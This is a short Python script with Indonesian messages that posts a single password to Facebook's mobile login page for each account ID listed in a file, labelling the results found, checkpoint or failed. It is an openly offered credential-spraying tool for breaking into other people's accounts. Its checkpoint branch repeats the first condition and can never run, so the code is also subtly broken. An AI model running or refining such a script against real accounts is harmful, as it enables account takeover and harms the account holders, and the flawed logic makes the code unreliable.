import requests
import sys


id = input("Masukan Id : ")
pw = input("Masukan Password : ")


def project1(id,pw):
    url = "https://m.facebook.com/login.php"


    data = {"email":id, "pass":pw}

    r = requests.post(url, data=data)

    if "_rdc=1&_rdr" in r.url:
              print ("Password Di temukan", id, "=>", pw)
    elif "_rdc=1&_rdr" in r.url:
              print ("Akun Checkpoint", id, "=>", pw)
    else:
              print ("Akun Gagal", id, "=>", pw)




def project2(id,pw):
    ex = open('word.txt', "r").readlines()
    for i in ex:
              project1(i.strip(),pw)

try:

    project2(id,pw)

except:
    exit()
